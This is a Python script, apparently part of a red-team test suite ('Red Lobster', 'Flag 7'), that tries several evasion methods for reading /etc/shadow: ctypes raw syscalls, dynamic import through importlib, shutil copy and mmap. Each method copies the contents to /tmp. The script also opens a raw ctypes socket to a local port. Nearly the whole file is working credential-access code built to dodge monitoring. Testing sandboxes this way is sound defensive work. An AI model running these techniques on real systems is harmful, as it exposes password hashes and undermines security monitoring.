#!/usr/bin/env python3
"""Red Lobster v5 — Flag 7: RUNTIME ABUSE — Python payloads."""
import sys, os, struct

OUTDIR = "/tmp/redlobster/flag7"
SHADOW = "/etc/shadow"

def ensure_outdir():
    os.makedirs(OUTDIR, exist_ok=True)

def ctypes_read():
    """Read /etc/shadow via ctypes raw syscalls."""
    import ctypes, ctypes.util
    ensure_outdir()
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    fd = libc.open(SHADOW.encode(), 0)  # O_RDONLY
    if fd < 0:
        print(f"[ctypes_read] open failed (errno {ctypes.get_errno()})")
        return
    buf = ctypes.create_string_buffer(8192)
    n = libc.read(fd, buf, 8192)
    libc.close(fd)
    if n > 0:
        with open(f"{OUTDIR}/test_7_3.txt", "wb") as f:
            f.write(buf.raw[:n])
        print(f"[ctypes_read] wrote {n} bytes")
    else:
        print(f"[ctypes_read] read returned {n}")

def ctypes_connect():
    """Open socket + connect to 127.0.0.1:19999 via ctypes."""
    import ctypes, ctypes.util
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    # socket(AF_INET=2, SOCK_STREAM=1, 0)
    fd = libc.socket(2, 1, 0)
    if fd < 0:
        print(f"[ctypes_connect] socket failed (errno {ctypes.get_errno()})")
        return
    # struct sockaddr_in: family(2) + port(2) + addr(4) + pad(8)
    sa = struct.pack("!HH4s8s", 2, 19999, bytes([127,0,0,1]), b'\x00'*8)
    ret = libc.connect(fd, sa, len(sa))
    if ret < 0:
        print(f"[ctypes_connect] connect failed (errno {ctypes.get_errno()}) — expected if no listener")
    else:
        print("[ctypes_connect] connected to 127.0.0.1:19999")
    libc.close(fd)

def importlib_attack():
    """Dynamic import of os via importlib, then read /etc/shadow."""
    ensure_outdir()
    try:
        mod = __import__('importlib').import_module('os')
        fd = mod.open(SHADOW, mod.O_RDONLY)
        data = mod.read(fd, 8192)
        mod.close(fd)
        with open(f"{OUTDIR}/test_importlib.txt", "wb") as f:
            f.write(data)
        print(f"[importlib] read {len(data)} bytes")
    except PermissionError as e:
        print(f"[importlib] {e}")

def shutil_attack():
    """Copy /etc/shadow via shutil."""
    import shutil
    ensure_outdir()
    try:
        shutil.copyfile(SHADOW, f"{OUTDIR}/test_shutil.txt")
        print("[shutil] copied")
    except PermissionError as e:
        print(f"[shutil] {e}")

def mmap_attack():
    """Read /etc/shadow via mmap."""
    import mmap
    ensure_outdir()
    try:
        with open(SHADOW, "r") as f:
            mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            data = mm.read()
            mm.close()
        with open(f"{OUTDIR}/test_mmap.txt", "wb") as f:
            f.write(data)
        print(f"[mmap] read {len(data)} bytes")
    except PermissionError as e:
        print(f"[mmap] {e}")

ATTACKS = {
    "ctypes_read": ctypes_read,
    "ctypes_connect": ctypes_connect,
    "importlib": importlib_attack,
    "shutil": shutil_attack,
    "mmap": mmap_attack,
}

if __name__ == "__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "all"
    targets = ATTACKS.keys() if name == "all" else [name]
    for t in targets:
        if t in ATTACKS:
            try:
                ATTACKS[t]()
            except Exception as e:
                print(f"[{t}] error: {e}")
        else:
            print(f"Unknown attack: {t}")
